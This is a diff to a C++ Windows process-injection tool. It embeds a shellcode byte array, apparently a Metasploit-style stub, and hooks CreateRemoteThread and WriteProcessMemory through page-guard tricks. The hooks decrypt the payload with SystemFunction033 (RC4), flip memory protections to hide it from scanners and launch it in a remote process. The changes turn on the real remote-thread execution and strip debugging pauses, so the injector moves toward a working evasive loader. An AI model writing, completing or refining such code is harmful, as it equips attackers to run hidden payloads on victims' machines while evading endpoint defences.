@@ -7,7 +7,8 @@ using namespace std;
 
 typedef NTSTATUS(WINAPI* _SystemFunction033)(
     struct ustring* memoryRegion,
-    struct ustring* keyPointer);
+    struct ustring* keyPointer
+);
 
 
 struct ustring {
@@ -16,6 +17,34 @@ struct ustring {
     PVOID Buffer;
 } _data, key, _data2;
 
+
+bool SleepImplant(DWORD dwMilliseconds) {
+    HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    if (hEvent == NULL) {
+		return false;
+	}
+	HANDLE hTimer = NULL;
+	LARGE_INTEGER liDueTime;
+	liDueTime.QuadPart = -10000LL * dwMilliseconds;
+	hTimer = CreateWaitableTimer(NULL, TRUE, NULL);
+    if (hTimer == NULL) {
+		CloseHandle(hEvent);
+		return false;
+	}
+    if (!SetWaitableTimer(hTimer, &liDueTime, 0, NULL, NULL, FALSE)) {
+		CloseHandle(hEvent);
+		CloseHandle(hTimer);
+		return false;
+	}
+    if (WaitForSingleObject(hTimer, INFINITE) != WAIT_OBJECT_0) {
+		CloseHandle(hEvent);
+		CloseHandle(hTimer);
+		return false;
+	}
+	CloseHandle(hEvent);
+	CloseHandle(hTimer);
+	return true;    
+}
 
 char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
@@ -57,55 +86,45 @@ int getPidByProcName(const char* procname) {
 }
 
 HANDLE hookedCreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId) {
-    MessageBoxA(0, "Hooked CreateRemoteThread", "YAY!", 0);
+    //MessageBoxA(0, "Hooked CreateRemoteThread", "YAY!", 0);
     DWORD old;
-    SIZE_T bufferSize = sizeof(lpStartAddress);
-    BYTE* localBuffer = new BYTE[bufferSize];
+
     SIZE_T bytesRead = 0;
     // Resolve SystemFunction033 address from advapi32.dll 
+    _SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
 
     // Arrives here encrypted and with PAGE_NOACCESS
 
-    // Sleep(9520);
+    //SleepImplant(9520);
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_READWRITE, &old);
 
-    PVOID hMemory = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
-
     printf("Permisions changed to PAGE_READWRITE\n");
-    getchar();
 
     // Decryption with SystemFuncion033
     // Error porque no se puede acceder a la memoria con SystemFunction033 de lpStartAddress ya que esta en un proceso remoto
+    char _key[] = "1234567890123456";
 
+    key.Buffer = (&_key);
+    key.Length = sizeof(_key);
+    _data2.Buffer = shellcode;
+    _data2.Length = sizeof(shellcode);
 
+    SystemFunction033(&_data2, &key);
 
-    ReadProcessMemory(hProcess, lpStartAddress, localBuffer, bufferSize, &bytesRead);
+    printf("Decrypted Shellcode address = %p\n", shellcode);
 
-    // Create mapped file
-    HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, bufferSize, "Local\\S12");
-
-    // Map file to memory
-    PVOID mapViewMemory = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, bufferSize);
-
-    // Copy content to view from mapped file
-    memcpy(mapViewMemory, localBuffer, bufferSize);
-
-    //_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA("advapi32"), "SystemFunction033");
-    //SystemFunction033(&_data2, &key);
-    
-    printf("View Memory = %p\n", mapViewMemory);
-    getchar();
+    WriteProcessMemory(hProcess, lpStartAddress, &shellcode, sizeof(shellcode), &bytesRead);
+    printf("Shellcode written in the Address = %p\n", lpStartAddress);
+        
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_NOACCESS, &old);
 
-    getchar();
-
-    // Sleep(11120);
+    //SleepImplant(11120);
 
     VirtualProtectEx(hProcess, lpStartAddress, 1, PAGE_EXECUTE, &old);
 
-    //CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
+    CreateRemoteThread(hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId);
 
     VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
     return NULL;
@@ -137,14 +156,10 @@ HANDLE hookedWriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID l
     WriteProcessMemory(hProcess, lpBaseAddress, _data.Buffer, nSize, &numberOfBytesWritten);
     cout << "Writted Shellcode with: " << numberOfBytesWritten << " bytes in the Process";
 
-    getchar();
 
     VirtualProtectEx(hProcess, lpBaseAddress, 1, PAGE_NOACCESS, &old);
-    getchar();
 
-    // printf("Start");
-    // Sleep(9520);
-    // printf("End");
+    // SleepImplant(9520);
 
     return NULL;
 }
@@ -190,11 +205,9 @@ int main(int argc, char* argv[]) {
 
     printf("Shellcode Size: %d\n", sizeof(shellcode));
 
-    getchar();
     WriteProcessMemory(hProcess, hMemory, &shellcode, sizeof(shellcode), &copiedBytes);
 
     cout << "WriteProcessMemory Guard Completed" << endl;
-    getchar();
 
     VirtualProtect(&CreateRemoteThread, 1, PAGE_EXECUTE_READ | PAGE_GUARD, &old);
     printf("Setted as Page Guard  :  CreateRemoteThread Address: 0x%p\n", CreateRemoteThread);
